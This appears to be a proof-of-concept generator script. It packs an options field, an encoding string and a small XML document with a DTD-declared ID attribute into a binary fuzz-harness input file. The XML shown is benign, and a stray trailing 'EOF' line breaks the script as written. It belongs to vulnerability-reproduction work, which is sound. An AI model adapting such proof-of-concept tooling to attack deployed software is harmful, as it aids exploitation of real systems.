#!/usr/bin/env python3
import struct
import sys

def create_poc(xml_content, options=0, encoding=""):
    """Create a ByteStream format input file."""
    data = b""
    # 4-byte int options
    data += struct.pack("<i", options)
    # size_t string length + encoding string
    enc_bytes = encoding.encode("utf-8")
    data += struct.pack("<Q", len(enc_bytes))
    data += enc_bytes
    # raw XML data
    data += xml_content.encode("utf-8")
    return data

# Test XML with ID attribute
xml = '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ATTLIST root id ID #IMPLIED>
]>
<root id="x1">
  <child1/>
  <child2/>
  <child3/>
  <child4/>
  <child5/>
  <child6/>
  <child7/>
  <child8/>
  <child9/>
  <child10/>
</root>
'''

data = create_poc(xml)
with open("/tmp/poc_test.bin", "wb") as f:
    f.write(data)
print(f"Created POC file with {len(data)} bytes")
print(f"Hex: {data.hex()}")
EOF
